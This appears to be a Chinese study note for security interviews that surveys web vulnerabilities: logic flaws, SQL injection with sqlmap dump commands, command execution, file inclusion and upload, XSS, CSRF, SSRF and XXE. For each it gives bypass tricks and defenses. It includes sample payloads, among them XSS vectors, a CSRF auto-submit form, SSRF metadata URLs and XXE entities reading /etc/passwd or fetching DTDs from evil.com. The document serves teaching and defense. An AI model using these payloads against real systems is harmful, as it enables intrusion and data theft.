# 业务逻辑漏洞

*** 重放并发*** ：通过bp不断发送数据包，欺骗系统 **并发**指**同一时间**先目标发送请求，看高并发情况系统的业务处理逻辑，资源分配是否有缺陷

*** 场景***：领卷、点赞、关注、投票、登陆、支付

***攻击工具***：bp插件turbo-intruder-all.jar，

___

***信息轰炸***：利用业务缺陷，反复发送邮箱、验证码、站内信

***场景***：注册|找回密码|营销活动推送|

***原理***：网站系统没有对信息发送的**次数、时间**做限制，或者只做了有限限制，也就是**重放和并发**的利用

***绕过技巧***：空格绕过、加入特殊字符绕过、标记接口绕过（sms type r n unmber apitype）、bp插件SMS_Bomb_Fuzzer-3.1.jar

___

***弱口令***：容易被人猜到的密码 系统默认密码 eg：农商银行密码默认888888

***工具***：bp里面的Intruder模块

___

***任意用户行为漏洞***：登陆、注册、重置密码是没有严格限制

***支付逻辑漏洞***：修改支付订单时的数据包、任意金额修改、负数购买、四舍五入、整数溢出、修改优惠劵、修改运费、

___

***网站鉴权***：**cookie鉴权**不同用户有不同权限，可以登陆账号抓包查看鉴权信息，不断删除其中修改得cookie内容，确定身份验证字段 **请求头鉴权** 请求头中携带 “身份凭证”（如 Token），核心是“凭证自主携带、服务器验证有效性”

***网站越权***：**水平越权** 两个同级的用户AB **用户B**通过某种操作（修改数据包）可以操作**用户A**；**垂直越权** 两个不同级别的用户

***越权危害*** ：水平越权会造成敏感信息泄露 垂直会造成普通用户操作高权限操作

# SQL注入漏洞

***原理***：web应用对用户**可控数据**的**数据合法性**没有判断和过滤，用户可以构造注释掉开发者定义的查询语句，在结尾额外添加恶意SQL查询，实现欺骗服务器在管理员不知情的情况非法操作

***场景*** ：登陆注册、修改资料、模糊搜索框、分页 / 排序、Cookie/Header 注入

***危害***：获取敏感信息、绕过登陆认证、**文件系统操作、注册表操作、执行系统命令**（通过自定义函数或INTO OUTFILE/INTO DUMPFILE）

---



***绕过技巧***：

**绕过「空格」**过滤用注释符/* */代替空格、括号代替空格、特殊空白字符代替 

**绕过「关键字」过滤（如 SELECT、UNION、AND 等）** 大小写绕过、双写或多写绕过、内联注释绕过/*! ... */ 、等价关键字/逻辑替换

**绕过「引号」过滤（如单引号 '、双引号 "）** 宽字节注入、十六进制编码绕过、数字型

**绕过「函数」过滤（如 SUBSTRING、ASCII、CONCAT 等）** 找等价函数 ascll等价ord、函数嵌套绕过

**利用 Cookie/Referer/User-Agent 注入** 将查询语句写入请求头中

---



***修复*：**

**必须使用预编译语句（PreparedStatement）/ 参数化查询**（根本解决）

**严格的输入白名单校验**（仅允许合法字符，如数字、字母）

**对特殊字符进行转义**（但不如预编译可靠）

**使用 WAF 时，结合规则 + 行为检测**（避免仅依赖关键字匹配）

**最小权限原则**（数据库账号禁止高危权限）  

---

***SQL盲注*** ：猜，猜数据库名，数据库长度，字段名，字段长度

**布尔盲注**（点头yes摇头NO，即返回两种不同页面）

**时间盲注入** 页面没有回显 通过sleep()函数相应时间判断



***其他类型注入*** ：**万能密码**、**堆叠注入**（通过；分割语句） 、**报错注入**（页面有sql报错信息，可以认为制造错误，让查询结果回显出来）**DNSlog注入（OOB）**    `load_file()` 不只能读本地文件，还能读网络路径、**宽字节注入**

___





# SQLmap

SQL注入漏洞自动化工具

- **sqlmap  -h**  查看所有选项

***目标选项***

这些选项用于告诉 sqlmap 要测试的对象，是最基础的必选参数

- **sqlmap  -u**  指定测试的URL（支持GET参数） 

  `sqlmap -u "http://example.com/index.php?id=1"`

- **sqlmap  -r**  加载本地HTTP请求（常用于POST请求、复杂请求头场景）

   `sqlmap  -r  req.txt`

- **sqlmap  -m**  从文件读取多个目标URL（每行一个）  

  `sqlmap  -m  urls.txt`
  
  ---

***注入检测选项***

用于指定测试的参数、注入技术、数据库类型等，影响检测的精准度和范围

- **sqlmap  -p**  指定要测试的参数（默认是所有参数）

` sqlmap -u "http://example.com?id=1&page=2" -p "id"`

- **sqlmap  --dbms**  强制指定数据库类型（默认自动识别，可指定MySQL、mssql、Oracle）

`sqlmap -u "http://example.com?id=1" --dbms mysql`

- **sqlmap  --technique**  指定注入技术（U查询、B布尔、T时间、E报错）

`sqlmap -u "http://example.com?id=1" --technique UB`

- **sqlmap  --level**  测试级别（1-5级，默认1 越高payload越多）

`sqlmap -u "http://example.com?id=1" --level 3`

- **sqlmap  --risk**  风险级别（1-3，默认1 越高payload越“危险”）

`sqlmap -u "http://example.com?id=1" --risk 2`

---

***数据提取选项***

当确认存在注入漏洞后，用于提取数据库结构、数据、文件等信息

- **--current-db**  获取当前数据库名

`sqlmap -u "http://example.com/index.php?id=1"--current-db`

- **-D** 指定数据库名（必须要提取到数据库名字）

`sqlmap -u "http://example.com?id=1" -D 数据库名字`

- **--tables** 枚举指定数据库的表名（需先知道数据库名）

`sqlmap -u "http://example.com?id=1" -D "数据库名字" --tables`

- **-T** 指定表名字

`sqlmap -u "http://example.com?id=1" -D 数据库名字 -T 表名`

- **--columns** 枚举指定表的列名（需先知道数据库和表名）

`sqlmap -u "http://example.com?id=1" -D "库名" -T "表名" --columns`

- **-C** 指定字段名

`sqlmap -u "http://example.com?id=1" -D 数据库名字 -T 表名 -C 字段名`

- **--dump** 提取指定列的数据（需指定数据库、表、列名）

`sqlmap -u "http://example.com?id=1" -D "库名" -T "表名" -C "字段名" --dump`

- **--dump-all** 提取所有数据库的所有表数据（谨慎使用，数据量可能极大）

`sqlmap -u "http://example.com?id=1" -D "库名" --dump-all`

---

***输出控制选项***

- **-v** 输出详细程度（**0-6**，默认 **1**，**0** 只显示错误，**6** 显示所有细节）

`sqlmap -u "http://example.com?id=1" -v 3`

- **--batch** 自动化测试（默认会询问用户确认，**--batch** 自动选择默认选项）

`sqlmap -u "http://example.com?id=1" --batch`

- **--output-dir** 指定结果保存目录（默认在 **output/** 下）

`sqlmap -u "http://example.com?id=1" --output-dir "指定目录"`

- **--threads** 设置并发线程数（默认 **1**，最大 **10**，过高可能被 **WAF** 拦截）

`sqlmap -u "http://example.com?id=1" *--threads 5*`

# 命令与代码执行

### 命令执行

攻击者通过漏洞让目标执行未授权命令，最终达到控制目标窃取数据

***原理***：程序在处理用户**可控数据输入**时，未对输入内容做严格过滤和验证，导致用户的可控输入直接**被拼接进系统执行**。也就是把用户的可控输入直接当系统命令执行

**常见函数**

~~~bash 
PHP：system()、exec()、shell_exec()、passthru()
Python：os.system()、subprocess.call()、os.popen()
Java：Runtime.getRuntime().exec()
~~~

___

***场景***：

**ping、nslookup、tracert 网络测试功能**：用户输入 IP / 域名，后端直接拼接到 `ping $_GET['ip']`

**文件管理功能**：备份、压缩、解压、删除文件，直接执行 `rm` / `tar` / `zip`

**系统信息查询**：查看磁盘、进程、日志、网卡信息

**弱语言 / 弱写法**：PHP 中直接使用 `system()`、`exec()`、`shell_exec()`、`passthru()`、`popen()`

**框架 / 第三方组件漏洞**：某些插件、编辑器、监控脚本存在命令注入

**代码 / 沙箱绕过**：如某些模板引擎、表达式引擎未限制系统调用

---

**绕过**：

- 关键字过滤可通过**引号穿插、反斜杠、通配符、变量拼接、Base64 / 十六进制编码**绕过；
- 特殊字符受限用**路径模糊、环境变量、短命令**绕过；
- 无回显场景采用**DNS 外带、时间盲注、写文件、反弹 Shell**获取数据。

***防御修复***：禁止将用户输入直接拼接到系统命令、使用白名单，不使用黑名单、使用语言自带的安全执行方式（不拼接字符串）、 对输入严格过滤与转义、 最小权限原则、禁用危险函数、WAF/IDS 拦截



命令执行 = **用户可控输入 + 未过滤 + 直接拼系统命令**

防御核心 = **不拼接 + 白名单 + 安全 API + 降权限**

___



### 代码执行

***原理***：程序在执行用户输入时，缺乏有效过滤和验证，将用户可控数据输入**当“合法代码”执行**，导致攻击者能注入运行恶意代码

**常见函数**

~~~bash
PHP：eval()、assert()（旧版本）、preg_replace()（带/e修饰符）
Python：exec()、eval()、compile()（配合执行函数）
JavaScript：eval()、new Function()
Java：ScriptEngine.eval()（执行脚本代码）
~~~

___

***场景***：

后台模板编辑、页面主题自定义

搜索 / 排序 / 筛选的表达式注入

在线代码运行、脚本调试

动态配置、自定义变量

导入导出、报表生成

反序列化数据处理（缓存、Cookie、接口数据）

___

***防御修复***：

 **禁用 / 避免危险函数：**禁用：`eval()`、`assert()`、`create_function()`、`preg_replace(/e)`

**严禁用户可控数据进入解析引擎：**禁止用户输入传入模板引擎、表达式引擎（SpEL/OGNL/SSTI）

**白名单校验：**对动态调用的类、方法、函数名做严格白名单；禁止用户输入直接拼接成代码逻辑

**安全编码规范：**不拼接代码字符串执行；不用反序列化处理用户可控数据

**运行环境加固：**最小权限运行服务；关闭危险函数、禁用系统调用；使用安全框架、开启安全模式

___

### 代码执行VS命令执行

| 对比项   | 代码执行                            | 命令执行                           |           |
| -------- | ----------------------------------- | ---------------------------------- | --------- |
| 执行内容 | 编程语言代码（PHP/Python/Java 等）  | 操作系统命令（Linux/Windows 指令） |           |
| 作用层面 | 应用脚本层                          | 操作系统层                         |           |
| 典型函数 | PHP：eval、assertPython：eval、exec | PHP：system、execPython：os.system |           |
| 利用语法 | 对应语言语法（如 `phpinfo();`）     | 系统命令 + 连接符（`;id`,`         | whoami`） |
| 包含关系 | 代码执行 **可直接调用** 命令执行    | 命令执行 **无法直接** 执行代码     |           |
| 常见场景 | 模板注入、表达式注入、动态执行      | ping、nslookup、系统管理功能       |           |

# 文件包含漏洞

***原理***：文件包含漏洞由于开发者**使用了不安全的文件包含函数（include、require、include_once、require_once）允许动态加载文件，没有对文件路径进行严格的验证和过滤**，攻击者利用这些函数加载恶意文件。

**本质就是：把另一个文件的代码，直接复制粘贴到当前位置，然后当作 PHP 一起解析执行；用户可控输入被当作文件路径执行/加载。**

| 对比     | 本地文件包含 LFI         | 远程文件包含 RFI                   |
| -------- | ------------------------ | ---------------------------------- |
| 包含路径 | 本地服务器上的文件       | 远程服务器上的文件（URL）          |
| 示例     | `include './1.php'`      | `include 'http://x.com/shell.php'` |
| 依赖条件 | 几乎默认都可以           | 需要开启 `allow_url_include = On`  |
| 难度     | 低，非常常见             | 高，现在默认都关闭                 |
| 利用方式 | 读配置、日志包含、伪协议 | 直接远程挂马拿 Shell               |
| 危害     | 读文件、条件 getshell    | 直接 getshell，危害更大            |

**LFI：包含本机文件**，靠日志、上传、伪协议 getshell

**RFI：包含远程网址**，直接拉别人的恶意代码执行，**前提是 PHP 允许远程包含**

___

***场景***：

**页面加载、路由跳转：**`?page=index   ?module=home  这类动态加载模板文件`

**加载配置、语言包：**`?lang=cn?    config=web  加载语言 / 配置文件`

**头像、附件预览：**看似读图片，实际用了 include 加载

**缓存、日志读取：**读取本地日志、缓存文件

**插件 / 主题加载：**后台切换模板、插件时包含文件

一句话：**凡是 URL 里有文件名、路径参数，后端用 include/require 加载的地方，基本都可能出文件包含。**

___

***利用***

**PHP伪协议利用**

~~~bash
file:// — 访问本地文件系统
http:// — 于访问远程文件（需要allow_url_include开启）。
ftp:// — 访问 FTP(s) URL
php:// —访问各个输入/输出流（I/Ostreams）、过滤器等
 常见子协议：
 php://input：读取POST请求的原始数据。
 php://filter：对文件内容进行过滤或编码。 
zlib:// — 压缩流
data:// —数据（RFC 2397）用于直接嵌入数据（如Base64编码的数据）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
~~~

***文件包含日志Getshell***：Web服务器通常会记录访问日志，包括URL、请求头信息、来源IP，攻击者构造恶意请求信息再文件包含日志，实现执行注入恶意代码。

___

***修复 防御***：

**永远不要相信用户输入的文件路径**

1. 白名单机制（最推荐）
2. 禁止路径拼接
3. 过滤危险字符（辅助措施）
4. 关闭远程文件包含（RFI）
5. 限制目录访问（重要）
6. 使用绝对路径
7. 最小权限原则

___



# 文件上传漏洞

***原理***：在进行文件上传时，服务端代码未对上传的文件进行严格验证和过滤，造成任意文件上传。

**用户可控输入 → 落地到服务器文件系统 → 被解释执行**

 ***危害***：

- Webshell 控制服务器
- 提权（结合内核漏洞）
- 横向移动（内网渗透）
- 挂马 / 钓鱼页面
- 勒索软件投递
- 数据窃取（数据库配置文件等）
- 持久化后门

____

***利用条件***

1. 成功上传文件到服务器
2. 文件能够被访问到
3. 文件被解释器解析执行

___



**绕过技巧**：

1. 禁用前端JavaScript
2. 修改MIME类型
3. 大小写混写
4. 双写后缀
5. 配置文件
6. 文件头伪造
7. 条件竞争

____



***防御措施***

1. 严格白名单
2. 后端校验（重点）
3. 重命名文件
4. 存储到非 Web 目录
5. 禁止执行权限
6. 二次处理

____

# 跨站脚本攻击（XSS）

***原理***：在 Web 应用中，服务端未对用户输入的数据进行有效过滤或转义，导致恶意脚本被注入到页面中，并在浏览器端执行。

**用户可控输入 → 注入到页面 → 浏览器解析执行**

___

***危害***：

- 窃取用户 Cookie（会话劫持）
- 冒充用户身份操作（CSRF联动）
- 钓鱼攻击（伪造登录框）
- 页面篡改（挂马）
- 键盘记录（获取账号密码）
- 重定向恶意网站
- 获取敏感信息（Token、本地存储等）

___

***利用条件***

1. 存在用户输入点（输入框 / URL / Header 等）
2. 输入内容未经过滤或转义
3. 数据被返回并在前端页面渲染
4. 浏览器执行了恶意脚本

___

***绕过技巧***：

1. 编码绕过

   - HTML编码 / URL编码 / Unicode编码

2. 大小写混写

   ```
   <ScRiPt>
   ```

3. 事件绕过

   ```
   onerror / onclick / onload
   ```

4. 标签绕过

   - 不使用 `<script>`

   ```
   <img src=x onerror=alert(1)>
   ```

5. 过滤绕过

   - 双写 / 拼接

   ```
   <scr<script>ipt>
   ```

6. 协议绕过

   ```
   javascript:alert(1)
   ```

7. DOM 型绕过（重点🔥）

   - 前端 JS 操作 DOM 时引入漏洞

____

***分类（面试一定要说🔥）***

1. 反射型 XSS
   - 输入 → 立即返回
   - 一次性攻击（常见于 URL）
2. 存储型 XSS
   - 存入数据库 → 所有人访问触发
   - 危害最大
3. DOM 型 XSS
   - 不经过后端
   - 前端 JS 处理导致

___

***防御措施***

1. 输入过滤（黑白名单）

2. 输出编码（核心🔥）

   - HTML编码
   - JS编码
   - URL编码

3. 使用安全函数

   - 避免：

     ```
     innerHTML
     ```

   - 使用：

     ```
     textContent
     ```

4. Cookie 安全策略

   - HttpOnly（防止被 JS 读取）

5. CSP（内容安全策略）

   - 限制脚本来源

6. 框架防护

   - Vue / React 默认转义

___

# 跨站请求伪造（CSRF）

***原理***：攻击者诱导受害者在已登录状态下访问恶意页面，从而在受害者不知情的情况下向目标网站发送请求，利用浏览器自动携带身份凭证（如 Cookie）完成非法操作。

**用户已认证 → 诱导发起请求 → 浏览器自动携带凭证 → 服务端误认为合法请求**

------

***危害***：

- 修改用户信息（邮箱 / 密码）
- 非法转账、下单
- 绑定/解绑账户
- 管理员后台操作（高危）
- 配合 XSS 扩大攻击面

------

***利用条件***

1. 用户已登录目标网站（存在有效会话）
2. 浏览器会自动携带认证信息（如 Cookie）
3. 目标接口未校验请求来源或令牌
4. 存在可被利用的敏感操作接口（如转账、修改信息）

------

***绕过技巧***（理解机制即可，面试加分🔥）

1. 利用自动提交表单

   ```
   <form action="http://victim.com/transfer" method="POST">
       <input type="hidden" name="money" value="1000">
   </form>
   <script>document.forms[0].submit();</script>
   ```

2. GET 请求构造

   ```
   <img src="http://victim.com/delete?id=1">
   ```

3. Referer 绕过

   - 不同浏览器策略差异
   - 利用缺失或伪造场景

4. Token 获取（结合 XSS🔥）

   - 如果存在 XSS，可窃取 CSRF Token

5. JSON / 接口绕过

   - 利用宽松 Content-Type 校验

------

***防御措施（重点🔥）***

1. CSRF Token（核心）

   - 每个请求携带随机 Token
   - 服务端验证 Token

2. SameSite Cookie

   - 设置：

     ```
     SameSite=Strict / Lax
     ```

3. Referer / Origin 校验

   - 判断请求来源是否合法

4. 二次验证

   - 验证码 / 密码确认（关键操作）

5. 避免敏感操作使用 GET

   - 使用 POST + Token

6. 自定义请求头（AJAX）

   - 如：

     ```
     X-Requested-With
     ```

------

***和XSS区别***：

- XSS：**攻击用户浏览器（执行脚本）**
- CSRF：**利用用户身份发请求（不执行脚本）**

👉 一句话：

> XSS 是“拿你的浏览器执行代码”，CSRF 是“借你的身份发请求”。



___



# 服务器请求伪造（SSRF）

***原理***：由于**服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据**。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。

**用户可控URL → 服务端发起请求 → 访问内网/本地/云元数据 → 返回敏感信息**

------

***危害***：

- 探测内网（端口扫描 / 服务识别）
- 访问内网系统（如 Redis、数据库、管理后台）
- 读取本地文件（file://）
- 获取云服务器凭证（元数据服务）
- 打内网漏洞（如未授权访问）
- 绕过防火墙（借助服务器作为跳板）

------

***利用条件***

1. 存在可控的请求地址（URL 参数 / 图片加载 / API 请求等）
2. 服务端会根据用户输入发起请求（curl / file_get_contents 等）
3. 未对目标地址做限制或校验
4. 服务器能访问内网或敏感资源

___

***场景***

- **文件上传功能：**Web应用程序通常允许用户上传文件，攻击者可以上传包含恶意URL的文件，以触发SSRF漏洞。
- **图片处理功能：**Web应用程序通常包含图片处理功能，攻击者可以在图片URL中注入恶意的URL，以触发SSRF漏
- 洞。
- **URL重定向功能：**Web应用程序可能包含URL重定向功能，攻击者可以在重定向URL中注入恶意的URL，以触发SS
- RF漏洞。
- **API调用：**Web应用程序可能会使用API与其他服务进行交互，攻击者可以在API请求中注入恶意的URL，以触发

------

***常见利用方式（核心点🔥）***

1. 访问本地服务

   ```
   http://127.0.0.1:6379
   http://localhost:8080
   ```

2. 内网探测

   ```
   http://192.168.1.1
   http://10.0.0.1
   ```

3. 读取本地文件

   ```
   file:///etc/passwd
   ```

4. 云平台攻击（高危🔥）

   ```
   http://169.254.169.254/latest/meta-data/
   ```

5. 利用协议扩展

   ```
   gopher://
   dict://
   ftp://
   ```

------

***绕过技巧（面试加分🔥）***

1. IP 绕过

   - 十进制 / 八进制 / 十六进制表示

   ```
   http://2130706433   （=127.0.0.1）
   ```

2. 域名绕过

   - 绑定到内网 IP（DNS 重绑定）

3. URL 解析绕过

   ```
   http://127.0.0.1@evil.com
   ```

4. 短地址 / 重定向

   - 利用 302 跳转

5. 黑名单绕过

   - 使用：

     ```
     localhost → 127.1
     ```

------

***防御措施（重点🔥）***

1. 白名单机制（核心）

   - 只允许访问指定域名

2. 禁止访问内网地址

   - 过滤：

     ```
     127.0.0.1 / 10.x.x.x / 172.16.x.x / 192.168.x.x
     ```

3. 协议限制

   - 只允许：

     ```
     http / https
     ```

4. 关闭重定向

   - 防止跳转绕过

5. DNS 解析校验

   - 防止 DNS 重绑定

6. 网络隔离（重要🔥）

   - 限制服务器访问内网资源

7. 云环境防护

   - 禁止访问元数据地址

___

***和 CSRF 的区别（面试高频🔥）***

- CSRF：**利用用户浏览器发请求**
- SSRF：**利用服务器发请求**

👉 一句话总结：

> CSRF 是“借用户身份”，SSRF 是“借服务器权限”。

___



# XML 外部实体注入（XXE）

***原理***：应用在解析 XML 数据时，允许解析外部实体（External Entity），攻击者可构造恶意 XML，使服务器在解析过程中加载外部资源，从而读取本地文件或发起请求。

**用户可控 XML → 解析外部实体 → 读取本地/发起请求 → 泄露敏感信息**

实体是用来定义普通文本的变量。实体引用是对实体的引用

------

***危害***：

- 读取服务器本地文件（如配置文件）
- 获取敏感信息（数据库账号、密钥）
- SSRF（访问内网服务）
- 探测内网结构
- 拒绝服务（Billion Laughs 攻击）
- 配合其他漏洞进一步利用

------

***利用条件***

1. 应用接收并解析 XML 数据
2. 使用的解析器支持外部实体（默认开启）
3. 未禁用外部实体解析
4. 返回结果中可回显数据或存在带外通道

------

***常见利用方式（核心🔥）***

1. 读取本地文件

   ```
   <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <data>&xxe;</data>
   ```

2. SSRF 攻击

   ```
   <!ENTITY xxe SYSTEM "http://127.0.0.1:8080">
   ```

3. 读取远程资源

   ```
   <!ENTITY xxe SYSTEM "http://evil.com/xxe.txt">
   ```

4. 带外数据回传（OOB🔥）

   - 通过 DNS / HTTP 外带数据

------

***绕过技巧（面试加分🔥）***

1. 编码绕过

   - URL 编码 / 十六进制编码

2. 参数实体（高级利用🔥）

   ```
   <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
   %xxe;
   ```

3. 协议利用

   ```
   file://
   http://
   ftp://
   ```

4. 过滤绕过

   - 利用 XML 结构变形

------

***防御措施（重点🔥）***

1. 禁用外部实体（核心）
   - 不允许解析 `<!DOCTYPE>`
2. 使用安全解析库
   - 如关闭 XXE 的 XML parser
3. 输入校验
   - 限制 XML 内容结构
4. 最小权限原则
   - 限制应用读取文件权限
5. 网络隔离
   - 防止访问内网资源

___

***和 SSRF 的关系（面试高频🔥）***

- XXE：**通过 XML 解析触发**
- SSRF：**通过服务器发请求**

👉 关系：

> XXE 可以导致 SSRF
